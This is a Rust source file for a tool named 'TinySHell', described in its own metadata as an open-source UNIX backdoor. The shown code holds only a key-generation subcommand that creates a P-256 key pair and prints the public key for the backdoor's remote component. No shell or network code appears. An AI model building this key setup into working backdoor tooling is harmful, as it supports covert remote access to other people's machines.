#![allow(dead_code)]
use clap::{Parser, Subcommand};
use std::path::PathBuf;
use std::fs::{File, OpenOptions};
use std::io::Write;
use std::os::unix::io::FromRawFd;
use std::sync::Mutex;
use anyhow::Result;
use rand_core::OsRng;
use p256::SecretKey;

#[macro_use]
extern crate lazy_static;


lazy_static! {
    static ref STDIN: Mutex<File> = Mutex::new(unsafe { File::from_raw_fd(0) });
    static ref STDOUT: Mutex<File> = Mutex::new(unsafe { File::from_raw_fd(1) });
}

#[derive(Parser)]
#[clap(name = "TinySHell")]
#[clap(author = "Jocular")]
#[clap(version = "0.1.0")]
#[clap(about = "Open-source UNIX backdoor.", long_about = None)]
struct Cli {
    #[clap(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    KeyGen {
        #[clap(short, long, value_parser, value_name = "FILE")]
        out_file: PathBuf,
        #[clap(short, long, value_parser, value_name = "FILE")]
        in_file: Option<PathBuf>,
    },
}

fn keygen(out_file: &PathBuf, in_file: &Option<PathBuf>) -> Result<()> {
    // First, load the key
    let priv_key = if let Some(priv_key_path) = in_file {
        SecretKey::from_sec1_pem(&std::fs::read_to_string(priv_key_path)?)?
    } else {
        // or make a new one
        SecretKey::random(&mut OsRng)
    };
    
    // Print out the public key for use in the remote client
    let pub_key = priv_key.public_key().to_string();
    println!("Use the following string in the remote's argv. \
        This is your public key:\n{}", pub_key
        .replace("\n", "")
        .replace("-----BEGIN PUBLIC KEY-----", "")
        .replace("-----END PUBLIC KEY-----", ""));

    // Write the private key to out_file
    OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(out_file)?
        .write_all((*priv_key.to_pem(Default::default())?).as_bytes())?;
    Ok(())
}

fn main(){
    // Get the arguments
    let cli = Cli::parse();
    
    // Determine what subcommand we're using
    match &cli.command {
        Commands::KeyGen { out_file, in_file } => {
            println!("Generating a new private key for use on the local machine.");
            keygen(out_file, in_file).expect("Failed key gen.");
        }
    }
}
